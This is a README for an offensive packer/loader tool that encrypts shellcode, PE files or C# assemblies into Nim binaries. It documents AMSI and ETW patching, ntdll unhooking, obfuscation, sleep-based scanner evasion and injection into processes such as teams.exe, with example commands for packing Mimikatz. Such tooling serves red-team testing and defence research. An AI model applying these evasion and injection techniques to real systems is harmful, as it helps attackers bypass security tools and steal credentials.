# NimSyscallPacker / Loader

This Packer can be used to pack any C# Assembly, PE-File or Shellcode into a Nim binary. It will encrypt the target payload, build the corresponding Nim source code according to the given arguments and compiles it to an Nim binary.

```
NimSyscall_Loader v 1.0

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep --shellcode --COMVARETW --remoteinject --unhook --reflective --obfuscate --hide --noArgs --pe]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:
  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --csharp    Encrypt a C# Assembly to load it on runtime
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --shellcode    Encrypt shellcode to load it on runtime
  --sleep    Sleep 20 secconds before decryption to evade in memory scanners
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
  --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                     Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --pe    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
```


To pack Mimikatz for example with unhooking before execution and without patching AMSI use the following:

```
NimSyscall_Loader.exe --file=mimikatz.exe --unhook --noAMSI --pe
```

To pack Shellcode for local injection:

```
NimSyscall_Loader.exe --file=shellcode.bin --noAMSI
```

To load shellcode into a remote process:

```
NimSyscall_Loader.exe --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
```

To load a C# assembly:
```
NimSyscall_Loader.exe --file=Seatbelt.exe --csharp
```
